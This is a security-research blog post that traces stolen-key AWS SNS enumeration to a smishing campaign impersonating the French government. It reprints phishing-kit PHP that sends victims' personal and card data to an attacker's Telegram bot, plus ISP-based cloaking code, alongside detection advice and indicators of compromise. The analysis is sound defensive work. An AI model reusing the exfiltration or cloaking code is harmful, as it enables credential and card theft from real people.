Title: Tales from the cloud trenches: Using AWS CloudTrail to identify malicious activity and spot phishing campaigns | Datadog Security Labs

URL Source: https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/

Published Time: 2024-03-15T00:00:00Z

Markdown Content:
# Tales from the cloud trenches: Using AWS CloudTrail to identify malicious activity and spot phishing campaigns | Datadog Security Labs

[Security Labs](https://securitylabs.datadoghq.com/)

*   [ARTICLES](https://securitylabs.datadoghq.com/articles/ "ARTICLES")
*   [CLOUD SECURITY ATLAS](https://securitylabs.datadoghq.com/cloud-security-atlas/ "CLOUD SECURITY ATLAS")
*   [NEWSLETTER](https://securitylabs.datadoghq.com/newsletters/ "NEWSLETTER")
*   [ABOUT](https://securitylabs.datadoghq.com/about/ "ABOUT")

*   [ARTICLES](https://securitylabs.datadoghq.com/articles/ "ARTICLES")
*   [CLOUD SECURITY ATLAS](https://securitylabs.datadoghq.com/cloud-security-atlas/ "CLOUD SECURITY ATLAS")
*   [NEWSLETTER](https://securitylabs.datadoghq.com/newsletters/ "NEWSLETTER")
*   [ABOUT](https://securitylabs.datadoghq.com/about/ "ABOUT")

research

# Tales from the cloud trenches: Using AWS CloudTrail to identify malicious activity and spot phishing campaigns

March 15, 2024

*   [aws](https://securitylabs.datadoghq.com/articles/?tag=aws)
*   [threat detection](https://securitylabs.datadoghq.com/articles/?tag=threat_detection)

*   [twitter](https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Ftales-from-the-cloud-trenches-aws-activity-to-phishing%2F&text=Tales%20from%20the%20cloud%20trenches%3A%20Using%20AWS%20CloudTrail%20to%20identify%20malicious%20activity%20and%20spot%20phishing%20campaigns "twitter")
*   [reddit](https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Ftales-from-the-cloud-trenches-aws-activity-to-phishing%2F "reddit")

![Image 1: Tales From The Cloud Trenches: Using Aws Cloudtrail To Identify Malicious Activity And Spot Phishing Campaigns](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/hero.png?auto=format&h=712&dpr=1)

on this page

*   [Key points and observations](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#key-points-and-observations)
*   [Attacker activity: AWS SNS enumeration via stolen access keys](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#attacker-activity-aws-sns-enumeration-via-stolen-access-keys)
    *   [Cloudtrail API calls](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#cloudtrail-api-calls)

*   [Pivoting on IP addresses: Discovering a phishing campaign](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#pivoting-on-ip-addresses-discovering-a-phishing-campaign)
    *   [Phishing kit analysis](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#phishing-kit-analysis)

*   [Detection opportunities](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#detection-opportunities)
*   [How Datadog can help](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#how-datadog-can-help)
*   [Conclusion](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#conclusion)
*   [Indicators of compromise](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#indicators-of-compromise)

[![Image 2: Martin McCloskey](https://securitylabs.dd-static.net/img/authors/martin_mccloskey.png?auto=format&w=48&h=48&dpr=2&q=75) Martin McCloskey Senior Detection Engineer](https://securitylabs.datadoghq.com/articles/?author=Martin_McCloskey)

In this post, we explore how the tracking of [AWS Simple Notification Service (SNS)](https://aws.amazon.com/sns/) enumeration activity across multiple customer environments led to the takedown of a phishing site that was impersonating the French government.

## [Key points and observations](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#key-points-and-observations)

*   We observed likely malicious activity enumerating an AWS victim’s SMS sending capabilities via the `GetSMSAttributes` command.
*   The IP address `134[.]209.127.249` was running the `GetSMSAttributes` API call across multiple regions, in a short period of time. At this time, these attempts have failed.
*   Upon further investigation of the IP address, we were able to determine that it was running a phishing campaign impersonating the French government and had successfully phished user PII and credit card information. We confirmed this through a world-readable text file that had been left on the web server.
*   With further research, we were able to identify similar phishing sites impersonating the French government.
*   We assess with high confidence that attackers in this cluster configure phishing sites and perform smishing campaigns with victim AWS accounts from the same host.

[![Image 3](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/campaign-overview.png?auto=format&w=800&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/campaign-overview.png?auto=format)
## [Attacker activity: AWS SNS enumeration via stolen access keys](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#attacker-activity-aws-sns-enumeration-via-stolen-access-keys)

We observed an attacker attempting and failing to enumerate the settings for sending SMS messages (`GetSMSAttributes`) in 10 AWS regions over a period of five minutes, which we caught using one of our [out-of-the-box detections](https://docs.datadoghq.com/security/default_rules/def-000-6g0). This attacker behavior is a common enumeration technique, as we have covered in a [previous post](https://securitylabs.datadoghq.com/articles/following-attackers-trail-in-aws-methodology-findings-in-the-wild/#most-common-enumeration-techniques).

> _The attacker has compromised credentials, but they don't know where they’ve landed in the breached environment. Their goal is to gain situational awareness and understand the value and potential of the compromised account._

The likely purpose of this activity is _[smishing](https://www.fcc.gov/avoid-temptation-smishing-scams)_ (phishing via SMS messages). Spammers regularly abuse [stolen cloud and SaaS application keys](https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/) that can provide texting-as-a-service, which offers a convenient way to distribute the SMS spam and phishing, and carriers typically trust these apps.

Attackers with the correct permissions will enumerate SMS settings with `GetSMSAttributes` or `GetSMSSandboxAccountStatus` and then use the AWS SNS API call `Publish` to send out SMS messages with their phishing links.

Several publicly available threat actor toolsets abuse services like Twilio and Amazon SNS, attackers will then advertise on platforms like Telegram for individuals or groups interested in SMS spam or smishing. This is also reinforced by our [internal data](https://securitylabs.datadoghq.com/articles/following-attackers-trail-in-aws-methodology-findings-in-the-wild/#most-common-enumeration-techniques) with AWS SNS being one of the services that attackers target most frequently.

[![Image 4](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/smishing-toolsets-1.png?auto=format&w=600&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/smishing-toolsets-1.png?auto=format)[![Image 5](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/smishing-toolsets-2.png?auto=format&w=600&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/smishing-toolsets-2.png?auto=format)
### [Cloudtrail API calls](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#cloudtrail-api-calls)

The following table shows some of the relevant Cloudtrail API calls we have seen related to smishing attacks. It is worth noting `sns:Publish` is a [data plane event](https://docs.aws.amazon.com/sns/latest/dg/sns-logging-using-cloudtrail.html#data-plane-events-cloudtrail) and may need configured separately.

| **CloudTrail event** | **Threat Perspective** |
| --- | --- |
| `sns:GetSMSAttributes` | "What's the SMS monthly spend limit?" |
| `sts:GetCallerIdentity` | "What are the credentials I compromised?" |
| `sns:GetSMSSandboxAccountStatus` | "Is the account in a sandbox and therefore limited?" |
| `sns:Publish` | "Send an SMS message" |

## [Pivoting on IP addresses: Discovering a phishing campaign](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#pivoting-on-ip-addresses-discovering-a-phishing-campaign)

We discovered that one of the IPs targeting AWS SNS for smishing was also hosting a phishing page impersonating a French government website for the payment of fines.

It appeared that the attacker was using the same infrastructure to host their phishing page and target AWS environments for the purpose of sending out phishing links via SMS.

[![Image 6](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-user-details.png?auto=format&w=600&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-user-details.png?auto=format)[![Image 7](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-cc-details.png?auto=format&w=600&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-cc-details.png?auto=format)
Pivoting on the unique [URL path](https://urlscan.io/search/#page.url%3A%22app%2Fpages%2Fbill.php%22)`/app/pages/bill.php` using URLScan, we were able to find several other kits deployed over the last 11 months, across 20 domains.

```bash
dev-sergeffbon[.]pantheonsite[.]io
service-valid-data[.]com
payement[.]infraction-stationnement[.]com
amd-reglefr[.]com
service-routier[.]com
servicebps-publique[.]com
antai-telepaiment[.]com
antaiapaiement[.]fr
amendegouv-paiement[.]com
dev-sergeffbon[.]pantheonsite[.]io
je-reglemoninfraction[.]info
majoration-redirect[.]sytes[.]net
www[.]avis-impayer[.]info
dev-ghestyauth[.]pantheonsite[.]io
antai-gouv[.]do
service-amande[.]fr
www[.]amende-paiements-gouv[.]com
cf54754[.]tw1[.]ru
amendesgouvfr-paiment[.]info
www[.]assistance-verification[.]eu
```

During the investigation, we discovered an open directory on the web server, allowing us to confirm that three users had submitted their details to the phishing site.

[![Image 8](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-open-directory.png?auto=format&w=600&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-open-directory.png?auto=format)[![Image 9](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-server-directory.png?auto=format&w=600&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-server-directory.png?auto=format)
### [Phishing kit analysis](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#phishing-kit-analysis)

Armed with this additional information, we were able to hunt for the phishing kit on Virustotal and found four variations of this phishing kit attempting to impersonate the French government. Across these four kits, we counted only five unique user submissions of details (excluding entries that appeared to be tests or possible investigations).

One of the notable things we observed was the use of Telegram to send users’ PII, credit card details, and other request metadata to an attacker-controlled channel. This function was found in the `/server/config.php` file, which also contained [Telegram API tokens](https://securitylabs.datadoghq.com/articles/from-irc-to-instant-messaging-the-rise-of-malware-communication-via-chat-platforms/).

```php
function sendMessage($message, $page) {
    global $token,$chatCard,$chatVBVsg,$chatVBV,$chatOther;
    $chatid = $chatOther;

    if($page == "vbv")
    {
        $chatid = $chatVBV;
    }else if($page == "card")
    {
        $chatid = $chatCard;
    }

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
```

We analyzed the file `/server/ab.php` across each of the kits and determined that the file was intended to ensure the user was coming from a French network otherwise it would be redirected to a HTTP 404 not found or redirected to a legitimate French site. In addition, this data was also sent to Telegram along with the user’s PII and credit card information.

As you can see there was a hardcoded IP address left in two of the files. This IP belongs to `Bouygues Telecom SA` in France. It’s possible that this IP was left over from an attacker testing their phishing kit before deploying it.

```php
<SNIPPET>
if($test_mode){
$ip = "128[.]78.14.206";

}
else{
$ip = $_SERVER['REMOTE_ADDR'];
}
<SNIPPET>
/*if($country == "France" || $visitor_ip == "127.0.0.1")
{*/
    if (strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "Proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh") || strpos($org, "Telenet") || strpos($org, "telenet") || strpos($org, "sosh") || strpos($org, "proximus") || strpos($org, "Belgacom") || strpos($org, "orange") || strpos($org, "Skynet") || strpos($org, "PROXIMUS") || strpos($org, "Neuf") || strpos($org, "Numericable") || $visitor_ip == "127.0.0.1") {

    }else{
        die('HTTP/1.0 404 Not Found - ' . $org . ' - ' . $isps . ' - ' . $country);
    }
/*}else{
    die('HTTP/1.0 404 Not Found - ' . $country);
}*/
```

```php
if ($response) {
        // Analysez la réponse JSON
        $data = json_decode($response, true);

        // Vérifiez si l'IP est en France
        $pays = $data['country'] ?? '';
        if (strtolower($pays) == 'france') {
            header("Location: https://www.mediapart.fr/");
            exit;
        }
```

Finally, we determined that the attacker is able to monitor the phishing site—including the number of visitors, billing, and credit card information—under the `/panel` directory of the phishing kit.

[![Image 10](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-statistics.png?auto=format&w=600&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-statistics.png?auto=format)
## [Detection opportunities](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#detection-opportunities)

From an AWS perspective the attacker was targeting the SNS service with a long-term access key beginning with `AKIA`. There are various opportunities for detection of this activity, depending on your organization’s usage of the SNS service:

*   Monitor API calls for `GetSMSAttributes` or `GetSMSSandboxAccountStatus`. To increase the fidelity of this detection, you can filter for a long term access key, attempts across multiple regions in a short period of time, or suspicious IP addresses identified through threat intelligence.
*   Monitor usage and spikes in cloud costs. Spiking costs in SMS spending could be a possible indicator of malicious activity. AWS provides [guidance](https://repost.aws/knowledge-center/sns-sms-spending-limit-alarm) on how to set up an alarm in CloudWatch.

## [How Datadog can help](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#how-datadog-can-help)

Datadog [Cloud SIEM](https://www.datadoghq.com/product/cloud-siem/) and [Cloud Security Management (CSM)](https://www.datadoghq.com/product/cloud-security-management/) comes with the following out-of-the-box rules to identify suspicious activity relevant to these attacks in an AWS environment. The Cloud SIEM rules help identify potential threats against the AWS SNS service, while the CSM rules help identify long-lived or stale access keys. [Long-lived access keys](https://www.datadoghq.com/state-of-cloud-security/#1) tend to carry a higher risk of being associated with a compromise.

*   [Amazon SNS enumeration attempt by previously unseen user](https://docs.datadoghq.com/security/default_rules/def-000-eyt)
*   [Amazon SNS enumeration in multiple regions using a long-term access key](https://docs.datadoghq.com/security/default_rules/def-000-6g0)
*   [Access keys should be rotated every 90 days or less](https://docs.datadoghq.com/security/default_rules/bcz-prk-dr6)
*   [Inactive IAM access keys older than 1 year should be removed](https://docs.datadoghq.com/security/default_rules/r1s-kud-79s)

## [Conclusion](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#conclusion)

In response to this activity we contacted the hosting provider to take down the server and notified the [Computer Emergency Response Team (CERT)](https://www.cert.ssi.gouv.fr/about-cert-fr/) within French law enforcement. The hosting provider has since removed the server. This was an interesting case, as we have previously never seen an attacker reuse the same infrastructure to host their phishing site and target AWS to distribute their phishing attempt via SNS.

## [Indicators of compromise](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-aws-activity-to-phishing/#indicators-of-compromise)

| Indicator | Type |
| --- | --- |
| 3a2ef352bf4d15a9ca355ed127bbb888adeebd5536509fe75716fa3876b89544 | Phishing kit zip file - SHA256 |
| 2ec288eebbc567a1894255525e96b47517b0d8df5929fb9654af1556875dc1bf | Phishing kit zip file - SHA256 |
| 03f595e280253cc99cda230d2709cefce97b32fa981fa51f7290223e3a9ca516 | Phishing kit zip file - SHA256 |
| E37ff64c05493fe5c5350b13487db1b6ef72721faf9e522faae85aeec90b4842 | Phishing kit zip file - SHA256 |
| 134[.]209.127.249 | IP address |
| 64[.]23.212.130 | IP address |
| dev-sergeffbon[.]pantheonsite[.]io | Domain |
| service-valid-data[.]com | Domain |
| payement[.]infraction-stationnement[.]com | Domain |
| amd-reglefr[.]com | Domain |
| service-routier[.]com | Domain |
| servicebps-publique[.]com | Domain |
| antai-telepaiment[.]com | Domain |
| antaiapaiement[.]fr | Domain |
| amendegouv-paiement[.]com | Domain |
| dev-sergeffbon[.]pantheonsite[.]io | Domain |
| je-reglemoninfraction[.]info | Domain |
| majoration-redirect[.]sytes[.]net | Domain |
| www[.]avis-impayer[.]info | Domain |
| dev-ghestyauth[.]pantheonsite[.]io | Domain |
| antai-gouv[.]do | Domain |
| service-amande[.]fr | Domain |
| www[.]amende-paiements-gouv[.]com | Domain |
| cf54754[.]tw1[.]ru | Domain |
| amendesgouvfr-paiment[.]info | Domain |
| www[.]assistance-verification[.]eu | Domain |

*   [twitter](https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Ftales-from-the-cloud-trenches-aws-activity-to-phishing%2F&text=Tales%20from%20the%20cloud%20trenches%3A%20Using%20AWS%20CloudTrail%20to%20identify%20malicious%20activity%20and%20spot%20phishing%20campaigns "twitter")
*   [reddit](https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Ftales-from-the-cloud-trenches-aws-activity-to-phishing%2F "reddit")

## Did you find this article helpful?

## Subscribe to the Datadog Security Digest

Get the latest insights from the cloud security community and Security Labs posts, delivered to your inbox monthly. No spam.

### Thank you for subscribing!

## Related Content

[![Image 11: Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence](https://securitylabs.dd-static.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&w=447&dpr=1) research Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence](https://securitylabs.datadoghq.com/articles/abusing-entra-id-administrative-units/)[![Image 12: Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover](https://securitylabs.dd-static.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&w=447&dpr=1) research Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover](https://securitylabs.datadoghq.com/articles/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/)[![Image 13: An analysis of a TeamTNT doppelgänger](https://securitylabs.dd-static.net/img/emergingthreats_hero_globe.png?auto=format&w=447&dpr=1) research An analysis of a TeamTNT doppelgänger](https://securitylabs.datadoghq.com/articles/analysis-of-teamtnt-doppelganger/)[![Image 14: A confused deputy vulnerability in AWS AppSync](https://securitylabs.dd-static.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&w=447&dpr=1) research A confused deputy vulnerability in AWS AppSync](https://securitylabs.datadoghq.com/articles/appsync-vulnerability-disclosure/)

## work with us

We're always looking for talented people to collaborate with

featured positions

*   [Engineering Manager - Security Incident Response (EMEA) Security - Engineering](https://careers.datadoghq.com/detail/7339331/?gh_jid=7339331)
*   [Manager I, Engineering - Platform Trust & Safety Security - Engineering](https://careers.datadoghq.com/detail/7646952/?gh_jid=7646952)
*   [Engineering Manager I, Core Observability, Paris Security - Engineering](https://careers.datadoghq.com/detail/7727662/?gh_jid=7727662)
*   [Manager I, Security Engineering - Vulnerability Management Security - Engineering](https://careers.datadoghq.com/detail/7748975/?gh_jid=7748975)
*   [Senior Security Engineer, Security Incident Response Team (SIRT) Security - Engineering](https://careers.datadoghq.com/detail/7761259/?gh_jid=7761259)
*   [Staff Application Security Engineer Security - Engineering](https://careers.datadoghq.com/detail/7777798/?gh_jid=7777798)

We have 8 positions

[view all](https://careers.datadoghq.com/all-jobs/?parent_department_Engineering%5B0%5D=Engineering&child_department_Engineering%5B0%5D=Global%20Information%20Security)

© Datadog 2026

*   [TERMS](https://www.datadoghq.com/legal/terms/ "TERMS")
*   [PRIVACY](https://www.datadoghq.com/legal/privacy/ "PRIVACY")
*   [COOKIES](https://www.datadoghq.com/legal/cookies/ "COOKIES")

*   [twitter](https://www.twitter.com/datadoghq/ "twitter")
*   [rss](https://securitylabs.datadoghq.com/rss/feed.xml "rss")